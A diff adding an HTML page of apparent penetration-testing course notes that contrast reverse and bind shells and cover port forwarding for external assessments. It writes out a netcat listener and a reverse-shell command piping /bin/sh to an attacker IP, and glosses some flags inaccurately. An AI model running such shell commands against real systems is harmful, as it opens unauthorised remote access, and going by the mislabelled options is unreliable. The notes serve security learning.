@@ -1,0 +1,44 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Reverse Shells vs Bind Shells</title>
+</head><body>All the show is access to a Machine. So when we say we pop a shell that means we get access to a machine.<br/>
+<br/>
+<span style="font-size: 12pt"><span style="color: #ff0000">Reverse Shell<br/>
+</span></span><span style="font-size: 10pt"><span style="color: #000000">Reverse shell means that a victim connects to attacker(or us)<br/>
+<br/>
+!YOU MAY GET ASKED THIS QUESTION ABOUT SHELLS IN AN INTERVIEW, WHAT IS A REVERSE SHELL? - WHAT IS A BIND SHELL?<br/>
+<br/>
+</span></span><img height="290" src="image.png" width="600"/><br/>
+<br/>
+Target is connecting, Attackbox is listening.<br/>
+<br/>
+nc -lvp(listening verbose port) 4444 that means on our machine we're opening up that port when we use net cat on this machine.<br/>
+<br/>
+nc 192.168.1.1 4444 -e(establish) /bin/sh that means this machine want to connect this ip address and this port and then establish a bin shell in attacker machine.<br/>
+<br/>
+SO ALL WE'RE GOING TO DO WITH REVERSE SHELL IS WE'RE GOING TO LISTEN.<br/>
+<br/>
+<span style="color: #ff0000"><span style="font-size: 12pt">Bind Shell<br/>
+<br/>
+<img height="287" src="image 2.png" width="600"/><span style="font-size: 10pt"><br/>
+</span></span></span><span style="font-size: 12pt"><span style="font-size: 10pt">in here exploit goes out the target machine and say listen the 4444 port and establish a bin shell also in attacker machine we say connect to target machine through 4444 port.<br/>
+<br/>
+As a summary reverse shell means the target can expect to us. a bind shell means we connect to the target.<br/>
+<br/>
+!YOU ARE GOING TO USE REVERSE SHELL NINETY FIVE PERCENT OF THE TIME. THERE ARE INSTANCES WHERE YOU'RE GOING TO USE BIND SHELLS, BIND SHELLS MOST LIKELY TO BE ON AN EXTERNAL ASSESSMENT.<br/>
+<br/>
+</span></span><span style="font-size: 12pt"><span style="font-size: 10pt">!!</span></span>If you think about it a reverse shell you're sitting in your home network and you are sitting on a VM, in that VM is using an internal IP address is talking out through net. It's going through your public IP address and you're attacking a target. Well how are you going to connect that public IP address of the target back to yourself on an internal IP. (you have to set a port forwarding if you are going to use external assesment with reverse shell, because if we specify our public ip address to the target, target go to our router because that is our router's ip and because of that our router will not be able to handle this request because it doesn't know where to direct the incoming request so you have to tell this information with port forwarding.)<br/>
+<br/>
+You're going to have to set a port for it or port trigger on your firewall to talk into that specific machine. It's a little bit of extra work you're opening some stuff up on your side.<span style="color: #ff0000"><span style="font-size: 12pt"><br/>
+</span></span><span style="color: #ff0000"><span style="font-size: 12pt"><br/>
+</span></span>The other idea is to say hey bind shell why don't I just go ahead and open a port up on that target.<br/>
+All that my way through my public IP address and I'll just connect to that port.<span style="color: #ff0000"><span style="font-size: 12pt"><br/>
+</span></span>It doesn't care what IP address you're coming from, is just listening.<br/>
+So this is where bind shells are useful when we have to bypass some sort of firewall or just make sense sometimes a reversal just doesn't work. And we have to use a bind shell anyway.<br/>
+<br/>
+<br/>
+<img height="581" src="image 3.png" width="550"/><br/>
+<br/>
+this is the proof of concept<br/>
+</body></html>
